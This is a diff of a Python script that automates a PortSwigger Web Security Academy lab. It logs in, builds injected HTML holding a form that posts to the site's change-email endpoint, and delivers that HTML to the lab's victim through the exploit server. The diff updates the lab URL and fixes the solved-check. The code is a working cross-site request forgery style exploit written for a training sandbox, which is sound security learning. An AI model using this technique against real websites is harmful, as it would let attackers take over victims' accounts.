@@ -7,7 +7,7 @@ from rich.console import Console
 console = Console()
 session = Session()
 
-SERVER = "https://0ac8005b03f37a7cc086937400360077.web-security-academy.net"
+SERVER = "https://0ac5007904eb50e0c0c81400006f0094.web-security-academy.net"
 response = session.get(f"{SERVER}/login")
 html_document = html.fromstring(response.content)
 csrf_token = html_document.xpath("//section/form/input[@name='csrf']/@value")[0]
@@ -23,8 +23,6 @@ html_document = html.fromstring(response.content)
 exploit_server_link = html_document.xpath("//a[@id='exploit-link']/@href")[0]
 
 response = session.get(f"{exploit_server_link}")
-html_document = html.fromstring(response.content)
-
 injected_html = f"<form id=\"email-form\" action=\"{SERVER}/my-account/change-email\" method=\"POST\">" \
       "<label>Email</label>" \
           "<input required="" type=\"email\" name=\"email\" value=\"prova@example.com\">" \
@@ -50,9 +48,8 @@ response = session.post(f"{exploit_server_link}", data={
     "formAction": "DELIVER_TO_VICTIM"
 })
 
-console.log(response.text)
-console.log(response.status_code)
-solved_link = html_document.xpath("//section[@id='notification-labsolver']")
+response = session.get(f"{SERVER}")
+html_document = html.fromstring(response.content)
+solved_link = html_document.xpath("//section[@id='notification-labsolved']")
 if solved_link:
     console.log('You win')
-
